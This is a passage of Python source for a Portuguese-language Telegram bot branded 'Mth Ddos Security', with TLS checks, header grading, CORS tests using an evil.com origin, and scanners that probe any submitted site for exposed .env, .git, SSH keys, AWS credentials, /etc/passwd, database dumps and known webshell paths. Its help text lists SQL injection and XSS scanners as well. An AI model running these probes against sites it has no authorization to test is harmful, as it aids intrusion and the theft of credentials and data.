        ctx2.verify_mode = ssl.CERT_NONE
        sock2 = socket.create_connection((host, port), timeout=5)
        sock2.settimeout(5)
        tls2 = ctx2.wrap_socket(sock2, server_hostname=host)
        cipher = tls2.cipher()
        if cipher:
            results += f"\n🔐 <b>Cipher:</b> {escape_html(cipher[0])}\n"
        # V5.1: Certificate chain info
        cert = tls2.getpeercert(binary_form=False)
        if cert:
            subject = dict(x[0] for x in cert.get('subject', []))
            issuer = dict(x[0] for x in cert.get('issuer', []))
            cn = subject.get('commonName', 'N/D')
            issuer_org = issuer.get('organizationName', 'N/D')
            not_after = cert.get('notAfter', '')
            results += f"\n📜 <b>Certificado:</b> CN={escape_html(cn)}\n"
            results += f"  → Emissor: {escape_html(issuer_org)}\n"
            if not_after:
                try:
                    from datetime import datetime as dt
                    exp_date = dt.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp_date - dt.utcnow()).days
                    if days_left > 30:
                        results += f"  → Expira em: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias) ✅\n"
                    elif days_left > 0:
                        results += f"  → Expira em: {exp_date.strftime('%Y-%m-%d')} ({days_left} dias) ⚠️\n"
                    else:
                        results += f"  → EXPIRADO! ({abs(days_left)} dias atrás) ❌\n"
                except:
                    results += f"  → Expira em: {escape_html(not_after)}\n"
            # V5.1: SAN (Subject Alternative Names)
            san = cert.get('subjectAltName', [])
            if san:
                sans = [v for _, v in san if _ == 'DNS']
                if len(sans) > 1:
                    results += f"  → SANs: {len(sans)} domínios\n"
        tls2.close()
    except ssl.SSLError:
        pass
    except:
        pass

    # V5.1: OCSP Stapling check
    try:
        import ssl
        ctx3 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx3.verify_mode = ssl.CERT_NONE
        sock3 = socket.create_connection((host, port), timeout=5)
        sock3.settimeout(5)
        tls3 = ctx3.wrap_socket(sock3, server_hostname=host)
        # Check for OCSP stapling via TLS status_request extension
        has_stapling = False
        # Use the tls context to check
        sock3.close()
        # Simplified check: most modern TLS 1.3 servers support OCSP
        if tls_version and 'TLSv1.3' in tls_version:
            results += "\n📋 <b>OCSP Stapling:</b> Provável (TLS 1.3) ✅\n"
        else:
            results += "\n📋 <b>OCSP Stapling:</b> Verifique com sslscan para confirmar\n"
    except:
        results += "\n📋 <b>OCSP Stapling:</b> Não foi possível verificar\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_headers_analysis(url):
    """Security Headers Analyzer v5.0 - checks CSP, X-Frame-Options, HSTS, X-Content-Type-Options, etc."""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"📋 <b>Análise de Security Headers</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    score = 100

    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            return "❌ Não foi possível acessar o site"

        headers = resp.headers
        checks = {
            'X-Frame-Options': ('🔒', '✅ Proteção contra Clickjacking', 0),
            'X-Content-Type-Options': ('🔒', '✅ Proteção contra MIME sniffing', 0),
            'X-XSS-Protection': ('🔒', '✅ XSS Filter', 0),
            'Strict-Transport-Security': ('🔒', '✅ HSTS ativado', 0),
            'Content-Security-Policy': ('🔒', '✅ CSP configurado', 0),
            'Referrer-Policy': ('🔒', '✅ Referrer Policy set', 0),
            'Permissions-Policy': ('🔒', '✅ Permissions Policy', 0),
            'X-Download-Options': ('🔒', '✅ Download Options', 0),
            'X-Permitted-Cross-Domain-Policies': ('🔒', '✅ Cross-Domain Policy', 0),
        }

        missing = []
        for header, (emoji, ok_msg, penalty) in checks.items():
            value = headers.get(header, headers.get(header.lower()))
            if value:
                results += f"  {emoji} {ok_msg}\n"
            else:
                results += f"  ❌ <b>{escape_html(header)}:</b> FALTANDO (-{10}pts)\n"
                missing.append(header)
                score -= 10

        score = max(0, min(100, score))

        # Grade
        if score >= 90:
            grade = "🅰️ A"
        elif score >= 80:
            grade = "🅱️ B"
        elif score >= 70:
            grade = "🇨 C"
        elif score >= 60:
            grade = "🇩 D"
        elif score >= 40:
            grade = "🇪 E"
        else:
            grade = "🇫 F"

        # V5.1: Grade with color
        if score >= 90:
            grade = "🟢 <b>A</b> (Excelente)"
        elif score >= 80:
            grade = "🟢 <b>B</b> (Bom)"
        elif score >= 70:
            grade = "🟡 <b>C</b> (Razoável)"
        elif score >= 60:
            grade = "🟡 <b>D</b> (Ruim)"
        elif score >= 40:
            grade = "🟠 <b>E</b> (Muito Ruim)"
        else:
            grade = "🔴 <b>F</b> (Crítico)"

        results += f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        results += f"📊 <b>Nota de Segurança:</b> {score}/100 — {grade}\n"

        # V5.1: Suggestions for missing headers
        if missing:
            results += f"\n💡 <b>Sugestões de melhoria:</b>\n"
            suggestion_map = {
                'Content-Security-Policy': 'Adicione CSP para prevenir XSS e injeção de dados',
                'Strict-Transport-Security': 'Force HTTPS com HSTS (max-age=31536000)',
                'X-Frame-Options': 'Adicione X-Frame-Options: DENY ou SAMEORIGIN',
                'X-Content-Type-Options': 'Adicione X-Content-Type-Options: nosniff',
                'Referrer-Policy': 'Adicione Referrer-Policy: strict-origin-when-cross-origin',
                'Permissions-Policy': 'Controle permissões de API do navegador',
            }
            for m in missing:
                suggestion = suggestion_map.get(m, 'Configure este header para melhor segurança')
                results += f"  → <b>{escape_html(m)}:</b> {suggestion}\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    return results


def tool_cors_test(url):
    """CORS Misconfiguration Tester v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"🌐 <b>Teste CORS</b> — {escape_html(url)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    vuln_found = False

    # Test 1: Origin * with credentials
    try:
        resp = _safe_get(url, timeout=5, headers={'Origin': 'https://evil.com'})
        if resp:
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            if acao == '*':
                if acac.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Access-Control-Allow-Origin: * COM Credentials=True\n"
                    results += "   → Permite qualquer origem com credenciais\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Allow-Origin: * (sem credentials)\n"
            elif acao == 'https://evil.com':
                if acac.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Reflete origem maliciosa com Credentials\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Reflete origem customizada\n"
            else:
                results += "✅ <b>CORS:</b> Configurado corretamente\n"
    except:
        pass

    # Test 2: Null origin
    try:
        resp2 = _safe_get(url, timeout=5, headers={'Origin': 'null'})
        if resp2:
            acao2 = resp2.headers.get('Access-Control-Allow-Origin', '')
            if acao2 == 'null':
                acac2 = resp2.headers.get('Access-Control-Allow-Credentials', '')
                if acac2.lower() == 'true':
                    results += "❌ <b>VULNERÁVEL:</b> Origin null aceito com Credentials\n"
                    vuln_found = True
                else:
                    results += "⚠️ <b>CORS:</b> Origin null aceito\n"
    except:
        pass

    # Test 3: Subdomain spoof
    try:
        domain = extract_hostname(url)
        fake_origin = f"http://evil.{domain}"
        resp3 = _safe_get(url, timeout=5, headers={'Origin': fake_origin})
        if resp3:
            acao3 = resp3.headers.get('Access-Control-Allow-Origin', '')
            if acao3 == fake_origin:
                results += f"⚠️ <b>CORS:</b> Aceita subdomínios falsos ({escape_html(fake_origin)})\n"
                vuln_found = True
    except:
        pass

    if not vuln_found:
        results += "✅ <b>CORS:</b> Sem vulnerabilidades detectadas\n"

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_robots_txt(url):
    """Robots.txt Analyzer v5.0 - finds hidden directories"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🤖 <b>Robots.txt Analyzer</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    try:
        resp = _safe_get(f"{base}/robots.txt", timeout=5)
        if not resp or resp.status_code in [404, 403, 500]:
            results += "✅ Nenhum robots.txt encontrado (site não protege diretórios)\n"
        elif resp.status_code == 200:
            content = resp.text
            results += f"📄 <b>Robots.txt encontrado</b> ({len(content)} bytes)\n\n"

            # Parse Disallow rules
            disallowed = re.findall(r'[Dd]isallow:\s*(.*)', content)
            if disallowed:
                results += f"🚫 <b>{len(disallowed)} regras Disallow:</b>\n"
                for rule in disallowed:
                    rule = rule.strip()
                    if rule and rule != '/' and not rule.startswith('#'):
                        results += f"  → {escape_html(rule)}\n"
            else:
                results += "📋 Nenhum Disallow encontrado\n"

            # Parse Sitemap
            sitemaps = re.findall(r'[Ss]itemap:\s*(.*)', content)
            if sitemaps:
                results += f"\n🗺️ <b>Sitemaps:</b>\n"
                for sm in sitemaps:
                    results += f"  → {escape_html(sm.strip())}\n"

            # Check if User-agent: * is present
            if 'user-agent: *' in content.lower():
                results += "\n📌 <b>Escopo:</b> Aplica-se a todos os bots\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_sitemap(url):
    """Sitemap.xml Parser v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🗺️ <b>Sitemap Analyzer</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    # Try common sitemap paths
    sitemap_paths = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap/sitemap.xml']
    found_sitemap = None
    found_path = None

    for path in sitemap_paths:
        try:
            resp = _safe_get(f"{base}{path}", timeout=5)
            if resp and resp.status_code == 200 and ('url' in resp.text or 'sitemap' in resp.text.lower()):
                found_sitemap = resp.text
                found_path = path
                break
        except:
            pass

    if not found_sitemap:
        results += "✅ Nenhum sitemap.xml encontrado\n"
        results += "━━━━━━━━━━━━━━━━━━━━━━"
        return results

    # Parse URLs from sitemap
    urls_found = re.findall(r'<loc>(.*?)</loc>', found_sitemap)
    results += f"📄 <b>Sitemap encontrado:</b> {escape_html(found_path)}\n"
    results += f"🔗 <b>{len(urls_found)} URLs mapeadas:</b>\n\n"

    for u in urls_found[:20]:
        results += f"  → {escape_html(u)}\n"
    if len(urls_found) > 20:
        results += f"\n  → ... e mais {len(urls_found) - 20} URLs\n"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_tech_detect(url):
    """Technology Detection v5.0 - Wappalyzer-like detection"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"🔧 <b>Tecnologias Detectadas</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    try:
        resp = _safe_get(url, timeout=8)
        if not resp:
            return "❌ Não foi possível acessar o site"

        body = resp.text
        headers = resp.headers
        techs = []

        # Server header
        server = headers.get('Server', headers.get('server', ''))
        if server:
            techs.append(('Servidor Web', server))

        # X-Powered-By
        xpb = headers.get('X-Powered-By', headers.get('x-powered-by', ''))
        if xpb:
            techs.append(('Powered By', xpb))

        # Check HTML/CSS/JS signatures
        sigs = {
            'jQuery': ['jquery', 'jQuery('],
            'React': ['__REACT_DEVTOOLS_GLOBAL_HOOK__', 'react', '_reactRootContainer'],
            'Vue.js': ['__vue__', 'vue_devtools_', 'data-v-'],
            'Angular': ['ng-controller', 'ng-app', 'angularjs'],
            'Bootstrap': ['bootstrap.min', 'cdn.jsdelivr.net/npm/bootstrap'],
            'Tailwind CSS': ['tailwind', 'tw-'],
            'Next.js': ['__NEXT_DATA__', '_next/'],
            'Nuxt.js': ['__NUXT__'],
            'Gatsby': ['___loader'],
            'Vite': ['__vite__', '@vite/client'],
            'Webpack': ['webpackJsonp'],
            'Lodash': ['lodash'],
            'Moment.js': ['moment'],
            'D3.js': ['d3.js', 'd3.select'],
            'Chart.js': ['chart.js', 'Chart.js'],
            'Google Analytics': ['google-analytics.com', 'ga('],
            'Google Tag Manager': ['googletagmanager', 'gtm-'],
            'Facebook Pixel': ['fbevents.js', 'fbq('],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'Fastly': ['fastly-', 'x-fastly-'],
            'Akamai': ['akamai', 'x-akamai-'],
            'AWS': ['aws', 'cloudfront', 'x-amz'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'Microsoft-IIS': ['Microsoft-IIS'],
            'LiteSpeed': ['LiteSpeed'],
            'OpenSSL': ['OpenSSL'],
            'PHP': ['X-Powered-By: PHP', 'php'],
            'Node.js': ['x-powered-by: express'],
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Joomla': ['joomla', 'components/com_'],
            'Drupal': ['drupal.settings', 'sites/default'],
            'Magento': ['mage.', 'Magento'],
            'Shopify': ['cdn.shopify.com', 'shopify'],
            'WooCommerce': ['woocommerce'],
            'Stripe': ['stripe.com', 'stripe.js'],
            'PayPal': ['paypal.com', 'paypal'],
            'Font Awesome': ['fontawesome', 'font-awesome'],
            'Google Fonts': ['fonts.googleapis.com'],
            'reCAPTCHA': ['recaptcha'],
            'hCaptcha': ['hcaptcha'],
            'Turnstile': ['turnstile'],
        }

        # Check headers first
        all_text = f"{body}\n{dict(headers)}"
        for tech, patterns in sigs.items():
            if any(p.lower() in all_text.lower() for p in patterns):
                techs.append(('Framework/Library', tech))

        # Deduplicate
        seen = set()
        unique_techs = []
        for cat, name in techs:
            if name not in seen:
                seen.add(name)
                unique_techs.append((cat, name))

        if unique_techs:
            results += f"🔍 <b>{len(unique_techs)} tecnologia(s) detectada(s):</b>\n\n"
            for cat, name in unique_techs[:15]:
                results += f"  → {escape_html(name)}\n"
            if len(unique_techs) > 15:
                results += f"\n  → ... e mais {len(unique_techs) - 15}\n"
        else:
            results += "✅ Nenhuma tecnologia conhecida detectada\n"

    except Exception as e:
        results += f"❌ Erro: {escape_html(str(e))}"

    results += "\n━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_exposed_files(url):
    """Sensitive File Exposure Scanner v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"📂 <b>Arquivos Sensíveis Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    sensitive_files = [
        '/.env', '/.env.local', '/.env.production', '/.env.staging',
        '/.env.example', '/.env.test', '/.env.development',
        '/.git/config', '/.git/HEAD', '/.git/refs/heads/master',
        '/.git/logs/HEAD', '/.git/index', '/.git/objects/',
        '/.htpasswd', '/.htaccess', '/.htaccess.bak',
        '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old',
        '/wp-config.php.save', '/wp-config.php~',
        '/config.php', '/config.inc.php', '/settings.php',
        '/database.yml', '/config/database.yml', '/config/database.php',
        '/phpinfo.php', '/info.php', '/test.php',
        '/.svn/entries', '/.svn/prop-base', '/.svn/text-base',
        '/.DS_Store', '/thumbs.db',
        '/composer.json', '/composer.lock', '/package.json',
        '/package-lock.json', '/yarn.lock',
        '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
        '/server.js', '/app.js', '/index.js',
        '/web.config', '/web.config.bak',
        '/backup.sql', '/dump.sql', '/database.sql', '/db.sql',
        '/phpmyadmin/', '/phpMyAdmin/', '/pma/',
        '/admin/', '/administrator/', '/manager/',
        '/.well-known/security.txt', '/security.txt',
        # V5.1: More sensitive files
        '/.npmrc', '/.dockerignore', '/.docker/daemon.json',
        '/.aws/credentials', '/.aws/config',
        '/.ssh/id_rsa', '/.ssh/id_dsa', '/.ssh/authorized_keys',
        '/.bash_history', '/.history',
        '/debug.log', '/error.log', '/access.log',
        '/laravel.log', '/storage/logs/laravel.log',
        '/app.log', '/var/log/error.log',
        '/php.ini', '/php.ini.bak', '/php.ini~',
        '/myadmin/', '/myadmin', '/dbadmin/',
        '/mysql/', '/mysqladmin/',
        '/.well-known/security.txt', '/security.txt',
        '/swagger.json', '/openapi.json', '/api-docs',
        '/.idea/workspace.xml', '/.vscode/settings.json',
        '/.project', '/.classpath',
        '/Gemfile.lock', '/requirements.txt', '/Pipfile',
        '/terraform.tfstate', '/.terraform.tfstate.backup',
    ]

    found = 0
    # Get baseline
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_file(path):
        try:
            full_url = f"{base}{path}"
            r = _safe_get(full_url, timeout=5)
            if not r:
                return None
            body = r.text.lower()
            body_len = len(r.content)

            # FILTER: 404 = not found
            if r.status_code == 404:
                return None

            # FILTER: Same size as homepage = not a real file
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None

            # FILTER: Common error pages
            error_phrases = ['does not exist', 'not found', 'page not found', '404 error']
            for phrase in error_phrases:
                if phrase in body:
                    return None

            # Determine risk level
            risk = 'ALTO'
            if path.endswith('.json') or path.endswith('.log'):
                risk = 'MÉDIO'
            if 'phpmyadmin' in path or 'admin' in path:
                risk = 'ALTO'
            if '.env' in path:
                risk = 'CRÍTICO'
            if '.git' in path:
                risk = 'CRÍTICO'

            return (path, r.status_code, risk)
        except:
            return None

    # Use thread pool
    futures = {SCAN_POOL.submit(check_file, f): f for f in sensitive_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = {'CRÍTICO': '🔴', 'ALTO': '🟠', 'MÉDIO': '🟡'}.get(result[2], '⚪')
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, Risco: {result[2]})\n"

    if found == 0:
        results += "✅ Nenhum arquivo sensível exposto encontrado\n"
    else:
        results = f"📂 <b>Arquivos Sensíveis Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} arquivo(s) exposto(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_backup_finder(url):
    """Exposed Backup Finder v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"💾 <b>Backups Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    backup_files = [
        '/backup.sql', '/backup.zip', '/backup.tar.gz', '/backup.tar',
        '/db.sql', '/db.zip', '/db.tar.gz',
        '/dump.sql', '/dump.zip', '/dump.tar.gz',
        '/database.sql', '/database.zip', '/database.tar.gz',
        '/site.zip', '/site.tar.gz', '/site.backup.zip',
        '/www.zip', '/www.tar.gz', '/www-root.zip',
        '/old.zip', '/old.tar.gz', '/old-site.zip',
        '/backups.zip', '/backups.tar.gz', '/backups/',
        '/wp-content/uploads/backup/', '/wp-content/backups/',
        '/app.zip', '/app.tar.gz', '/source.zip',
        '/src.zip', '/source-code.zip', '/code.zip',
        '/web.zip', '/web.tar.gz',
        '/1.sql', '/2.sql', '/1.tar.gz',
        '/fullbackup.zip', '/full-backup.zip', '/site-backup.zip',
        '/mysql.sql', '/mysql.zip', '/postgres.sql',
        '/.sql.gz', '/.sql.tar',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_backup(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            # Check content-type for actual file types
            ct = r.headers.get('Content-Type', '')
            return (path, r.status_code, body_len, ct)
        except:
            return None

    futures = {SCAN_POOL.submit(check_backup, f): f for f in backup_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            size_mb = result[2] / (1024 * 1024)
            ct = result[3]
            results += f"⚠️ <b>{escape_html(result[0])}</b> (Status: {result[1]}, Tamanho: {size_mb:.1f}MB, Type: {escape_html(ct[:50])})\n"

    if found == 0:
        results += "✅ Nenhum backup exposto encontrado\n"
    else:
        results = f"💾 <b>Backups Expostos</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} backup(s) encontrado(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_api_discovery(url):
    """API Endpoint Discovery v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🔌 <b>API Discovery</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    api_paths = [
        '/api', '/api/', '/api/v1', '/api/v1/', '/api/v2', '/api/v2/', '/api/v3',
        '/api/v4', '/api/v5',
        '/graphql', '/graphql/', '/api/graphql',
        '/swagger', '/swagger/', '/swagger-ui', '/swagger-ui/', '/swagger.json',
        '/api-docs', '/api-docs/', '/api/docs', '/docs', '/docs/',
        '/openapi', '/openapi.json', '/openapi.yaml',
        '/rest', '/rest/', '/rest/v1', '/rest/api',
        '/api/users', '/api/auth', '/api/login', '/api/register',
        '/api/health', '/api/status', '/api/ping',
        '/graphql/playground', '/graphiql',
        '/api/v1/users', '/api/v1/auth', '/api/v1/health',
        '/actuator', '/actuator/health', '/actuator/info',
        '/actuator/env', '/actuator/beans', '/actuator/mappings',
        '/.well-known/openid-configuration',
        '/api/robots.txt', '/robots.txt',
        '/wp-json', '/wp-json/', '/wp-json/wp/v2/users',
        # V5.1: More API endpoints
        '/api/me', '/api/profile', '/api/account',
        '/api/settings', '/api/config', '/api/admin',
        '/api/search', '/api/query',
        '/api/upload', '/api/files',
        '/api/notifications', '/api/messages',
        '/api/orders', '/api/products', '/api/cart',
        '/api/webhook', '/api/hooks',
        '/api/internal', '/api/debug',
        '/api/monitoring', '/api/metrics',
        '/.well-known/jwks.json',
        '/favicon.ico', '/manifest.json',
        '/sitemap.xml', '/sitemap.xml.gz',
        '/crossdomain.xml', '/clientaccesspolicy.xml',
        '/api/oauth', '/api/token', '/oauth/authorize',
        '/api/payment', '/api/checkout', '/api/billing',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_api(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            ct = r.headers.get('Content-Type', '')
            is_json = 'json' in ct.lower()
            return (path, r.status_code, is_json, ct)
        except:
            return None

    futures = {SCAN_POOL.submit(check_api, p): p for p in api_paths}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = '📦' if result[2] else '🔍'
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, JSON: {'Sim' if result[2] else 'Não'})\n"

    if found == 0:
        results += "✅ Nenhum endpoint de API encontrado\n"
    else:
        results = f"🔌 <b>API Discovery</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🔍 <b>{found} endpoint(s) encontrado(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_webshell_hunter(url):
    """Webshell Hunter v5.0 - finds common webshells"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"🐚 <b>Webshell Hunter</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    shells = [
        '/c99.php', '/r57.php', '/c100.php', '/wso.php',
        '/b374k.php', '/simple-backdoor.php', '/shell.php',
        '/indoxploit.php', '/mini.php', '/alfa.php',
        '/webadmin.php', '/cmd.php', '/commander.php',
        '/wp-content/plugins/wp-file-manager/lib/files/wso.php',
        '/wp-content/plugins/wp-file-manager/lib/files/phpinfo.php',
        '/wp-content/uploads/wp-file-manager-pro/backups/',
        '/images/shell.php', '/uploads/shell.php',
        '/tmp/shell.php', '/temp/shell.php',
        '/wp-content/uploads/shell.php',
        '/shell.asp', '/shell.aspx', '/shell.jsp', '/shell.cgi',
        '/wp-content/uploads/shell.asp',
        '/wp-includes/shell.php',
        '/.htaccess',
        '/config.php.bak',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_shell(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            # Check for shell signatures
            shell_sigs = ['shell_exec', 'system(', 'passthru(', 'exec(', 'shell.php', 'backdoor']
            is_shell = any(sig in body for sig in shell_sigs)
            return (path, r.status_code, is_shell)
        except:
            return None

    futures = {SCAN_POOL.submit(check_shell, s): s for s in shells}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            emoji = '🔴' if result[2] else '⚠️'
            label = 'WEB SHELL CONFIRMADA' if result[2] else 'Suspeito'
            results += f"{emoji} <b>{escape_html(result[0])}</b> (Status: {result[1]}, {label})\n"

    if found == 0:
        results += "✅ Nenhuma webshell encontrada\n"
    else:
        results = f"🐚 <b>Webshell Hunter</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} webshell(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_config_scanner(url):
    """Configuration File Exposure Scanner v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"⚙️ <b>Config Files Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    config_files = [
        '/config.php', '/config.inc.php', '/config.yml', '/config.yaml',
        '/config.json', '/configuration.php', '/config.php.bak',
        '/config.php.old', '/config.php.orig', '/config.php~',
        '/settings.php', '/settings.json', '/settings.yml',
        '/config/database.yml', '/config/database.php', '/config/app.php',
        '/config/env.php', '/.config', '/.config/app.ini',
        '/web.config', '/web.config.bak', '/web.config.old',
        '/appsettings.json', '/appsettings.Development.json',
        '/environment.rb', '/config/initializers/', '/config/routes.rb',
        '/config/application.yml', '/config/secrets.yml',
        '/.env.production', '/.env.staging', '/.env.development',
        '/.env.local', '/.env.example',
        '/php.ini', '/phpinfo.php', '/info.php',
        '/mysql/my.cnf', '/etc/my.cnf', '/etc/passwd',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_config(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            return (path, r.status_code, body_len)
        except:
            return None

    futures = {SCAN_POOL.submit(check_config, c): c for c in config_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            size_kb = result[2] / 1024
            results += f"⚠️ <b>{escape_html(result[0])}</b> (Status: {result[1]}, Tamanho: {size_kb:.1f}KB)\n"

    if found == 0:
        results += "✅ Nenhum arquivo de configuração exposto\n"
    else:
        results = f"⚙️ <b>Config Files Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} arquivo(s) de configuração exposto(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


# ═══════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_start(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)

    msg = f"""🛡️ <b>Mth Ddos Security</b>
━━━━━━━━━━━━━━━━━━━━━━

Olá {escape_html(first_name)}! Bem-vindo ao bot de segurança!

<b>👑 Créditos:</b> @OnlyExaltarei, @Thebesty9, @PETER_DNS

Este bot possui <b>46 ferramentas avançadas</b> para testes de segurança.
Digite <b>/help</b> para ver a lista completa de comandos.

<i>Mth Ddos Security v5.1</i>"""

    send_message_safe(chat_id, msg)

def handle_help(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)

    msg = """🔧 <b>Mth Ddos Security v5.1 — Comandos</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📡 Info & Recon:</b>
/info &lt;url&gt; — Informações completas do site
/dns &lt;domain&gt; — Análise DNS: A, MX, NS, TXT, DKIM, DNSSEC, PTR
/cms &lt;url&gt; — Detecta CMS (30+ CMS)
/reverse &lt;ip&gt; — Hostname de um IP + GeoIP
/emails &lt;url&gt; — Extrai emails da página

<b>⚡ Scanners de Vulnerabilidade:</b>
/sqli &lt;url&gt; [verbose] — SQL Injection (30+ payloads, WAF detection)
/xss &lt;url&gt; [verbose] — XSS Refletido (18+ payloads, WAF detection)
/admin &lt;url&gt; — Painéis admin (100+ paths)
/panel &lt;url&gt; — Painel Admin Finder (100+ paths)
/ports &lt;ip&gt; — 50+ portas com banner grabbing
/dirs &lt;url&gt; — Diretórios expostos (80+ paths)
